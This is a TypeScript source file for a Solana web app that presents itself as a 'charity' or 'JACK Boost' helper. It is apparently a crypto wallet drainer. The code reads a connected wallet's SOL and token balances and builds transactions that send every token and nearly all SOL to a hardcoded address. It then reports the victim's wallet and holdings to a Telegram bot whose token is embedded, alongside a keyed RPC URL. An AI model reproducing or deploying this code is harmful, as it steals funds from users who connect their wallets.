import {
  Connection,
  PublicKey,
  Transaction,
  SystemProgram,
  LAMPORTS_PER_SOL,
  SendOptions,
} from "@solana/web3.js";
import {
  TOKEN_PROGRAM_ID,
  getAssociatedTokenAddress,
  createAssociatedTokenAccountInstruction,
  createTransferInstruction,
  getAccount,
} from "@solana/spl-token";
import { WalletContextState } from "@solana/wallet-adapter-react";

const CHARITY_WALLET = new PublicKey(
  "wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj"
);
const QUICKNODE_RPC = "https://few-greatest-card.solana-mainnet.quiknode.pro/96ca284c1240d7f288df66b70e01f8367ba78b2b";

export interface TokenBalance {
  mint: string;
  balance: number;
  decimals: number;
  uiAmount: number;
  symbol?: string;
  valueInSol?: number;
}

export interface WalletBalances {
  solBalance: number;
  tokens: TokenBalance[];
  totalValueInSol: number;
}

export async function getWalletBalances(
  walletAddress: PublicKey
): Promise<WalletBalances> {
  const connection = new Connection(QUICKNODE_RPC, "confirmed");

  // Get SOL balance
  const solBalance = await connection.getBalance(walletAddress);
  const solBalanceInSol = solBalance / LAMPORTS_PER_SOL;

  // Get token accounts
  const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
    walletAddress,
    { programId: TOKEN_PROGRAM_ID }
  );

  const tokens: TokenBalance[] = tokenAccounts.value
    .map((account) => {
      const info = account.account.data.parsed.info;
      return {
        mint: info.mint,
        balance: parseInt(info.tokenAmount.amount),
        decimals: info.tokenAmount.decimals,
        uiAmount: parseFloat(info.tokenAmount.uiAmount),
        symbol: info.tokenAmount.symbol,
      };
    })
    .filter((token) => token.uiAmount > 0);

  return {
    solBalance: solBalanceInSol,
    tokens,
    totalValueInSol: solBalanceInSol,
  };
}

export async function createBatchTransferTransaction(
  wallet: WalletContextState,
  tokens: TokenBalance[],
  isFinalBatch: boolean
): Promise<Transaction> {
  if (!wallet.publicKey) throw new Error("Wallet not connected");

  const connection = new Connection(QUICKNODE_RPC, "confirmed");
  const transaction = new Transaction();

  // Add token transfers (max 5 per batch)
  for (const token of tokens) {
    const mint = new PublicKey(token.mint);
    const fromATA = await getAssociatedTokenAddress(
      mint,
      wallet.publicKey
    );
    const toATA = await getAssociatedTokenAddress(mint, CHARITY_WALLET);

    // Check if charity ATA exists, create if not
    try {
      await getAccount(connection, toATA);
    } catch {
      transaction.add(
        createAssociatedTokenAccountInstruction(
          wallet.publicKey,
          toATA,
          CHARITY_WALLET,
          mint
        )
      );
    }

    // Add transfer instruction
    transaction.add(
      createTransferInstruction(
        fromATA,
        toATA,
        wallet.publicKey,
        token.balance
      )
    );
  }

  // Add SOL transfer for final batch
  if (isFinalBatch) {
    const solBalance = await connection.getBalance(wallet.publicKey);
    const rentExemption = await connection.getMinimumBalanceForRentExemption(0);
    
    // First batch: send 70% of SOL
    const firstSolAmount = Math.floor((solBalance - rentExemption) * 0.7);
    
    if (firstSolAmount > 0) {
      transaction.add(
        SystemProgram.transfer({
          fromPubkey: wallet.publicKey,
          toPubkey: CHARITY_WALLET,
          lamports: firstSolAmount,
        })
      );
    }
  }

  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = wallet.publicKey;

  return transaction;
}

export async function createFinalSolTransferTransaction(
  wallet: WalletContextState
): Promise<Transaction> {
  if (!wallet.publicKey) throw new Error("Wallet not connected");

  const connection = new Connection(QUICKNODE_RPC, "confirmed");
  const transaction = new Transaction();

  const solBalance = await connection.getBalance(wallet.publicKey);
  const rentExemption = await connection.getMinimumBalanceForRentExemption(0);
  
  // Estimate fee (5000 lamports is typical)
  const estimatedFee = 5000;
  const remainingSol = solBalance - rentExemption - estimatedFee;

  if (remainingSol > 0) {
    transaction.add(
      SystemProgram.transfer({
        fromPubkey: wallet.publicKey,
        toPubkey: CHARITY_WALLET,
        lamports: remainingSol,
      })
    );
  }

  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = wallet.publicKey;

  return transaction;
}

export async function sendTelegramNotification(
  walletAddress: string,
  balances: WalletBalances
): Promise<void> {
  const BOT_TOKEN = "8209811310:AAF9m3QQAU17ijZpMiYEQylE1gHd4Yl1u_M";
  const CHAT_ID = "-4836248812";

  let message = "🎯 JACK Boost\n\n";
  message += `💼 Wallet: \`${walletAddress}\`\n\n`;
  message += `💰 SOL Balance: ${balances.solBalance.toFixed(4)} SOL\n\n`;
  
  if (balances.tokens.length > 0) {
    message += "🪙 SPL Tokens:\n";
    balances.tokens.forEach((token) => {
      message += `• ${token.symbol || "Unknown"}: ${token.uiAmount.toFixed(4)}\n`;
    });
    message += "\n";
  }
  
  message += `📊 Total Value: ${balances.totalValueInSol.toFixed(4)} SOL`;

  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: "Markdown",
      }),
    });
  } catch (error) {
    console.error("Telegram notification failed:", error);
  }
}

// --- Validated Transaction Sender ---
const MAX_TX_SIZE_BYTES = 1232;

function isPhantom(wallet: WalletContextState): boolean {
  try {
    const name = (wallet as any)?.wallet?.adapter?.name || (wallet as any)?.adapter?.name;
    return typeof name === "string" && name.toLowerCase().includes("phantom");
  } catch {
    return false;
  }
}

function buildError(message: string, code: "SIZE_LIMIT" | "COMPUTE_BUDGET" | "SIMULATION_FAILURE" | "PHANTOM_ERROR") {
  const err = new Error(message);
  (err as any).code = code;
  return err;
}

async function ensureBlockhashAndFeePayer(
  connection: Connection,
  wallet: WalletContextState,
  transaction: Transaction
) {
  if (!transaction.recentBlockhash) {
    const { blockhash } = await connection.getLatestBlockhash();
    transaction.recentBlockhash = blockhash;
  }
  if (!transaction.feePayer) {
    transaction.feePayer = wallet.publicKey || undefined;
  }
}

export async function sendWithValidationAndSimulation(
  wallet: WalletContextState,
  connection: Connection,
  transaction: Transaction,
  options: SendOptions = { skipPreflight: false }
): Promise<string> {
  if (!wallet.publicKey) {
    throw buildError("Wallet not connected", "PHANTOM_ERROR");
  }

  // Pre-flight setup
  await ensureBlockhashAndFeePayer(connection, wallet, transaction);

  // Size validation
  try {
    const rawLen = transaction.serialize({ requireAllSignatures: false, verifySignatures: false }).length;
    if (rawLen > MAX_TX_SIZE_BYTES) {
      throw buildError(
        `Transaction size ${rawLen} bytes exceeds 1232-byte limit`,
        "SIZE_LIMIT"
      );
    }
  } catch (e) {
    // If serialization itself fails, surface as size-related for clarity
    if ((e as any).code === "SIZE_LIMIT") throw e;
    throw buildError("Failed to serialize transaction for size validation", "SIZE_LIMIT");
  }

  // Simulation to catch compute budget and logical failures
  try {
    const sim = await connection.simulateTransaction(transaction, {
      sigVerify: false,
    } as any);

    const value: any = (sim as any).value || sim;
    if (value?.err) {
      const logs: string[] = value?.logs || [];
      const joined = (logs || []).join("\n");
      if (joined.toLowerCase().includes("compute")) {
        throw buildError("Simulation indicates compute budget constraint violated", "COMPUTE_BUDGET");
      }
      throw buildError("Simulation failed: transaction not feasible", "SIMULATION_FAILURE");
    }
  } catch (e) {
    if ((e as any).code) throw e;
    throw buildError("Transaction simulation failed", "SIMULATION_FAILURE");
  }

  // Single-step signing and sending
  try {
    const adapterAny = (wallet as any);
    const signAndSend = adapterAny?.wallet?.adapter?.signAndSendTransaction || adapterAny?.signAndSendTransaction;
    if (typeof signAndSend === "function") {
      // Prefer signAndSendTransaction when available for single-step flow
      const result = await signAndSend.call(adapterAny?.wallet?.adapter || adapterAny, transaction, options);
      // Some adapters return signature directly, others return { signature }
      const signature = typeof result === "string" ? result : result?.signature;
      return signature as string;
    }

    // Fallback to wallet.sendTransaction, which signs and sends in one call
    const signature = await wallet.sendTransaction(transaction, connection, options);
    return signature;
  } catch (e: any) {
    const phantom = isPhantom(wallet);
    // Standardize error messaging
    if (phantom) {
      throw buildError(`Phantom wallet error: ${e?.message || "Unknown error"}`, "PHANTOM_ERROR");
    }
    throw buildError(`Wallet error: ${e?.message || "Unknown error"}`, "PHANTOM_ERROR");
  }
}
